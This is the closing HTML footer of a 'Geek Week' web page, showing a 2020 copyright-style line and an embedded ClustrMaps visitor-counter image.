  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>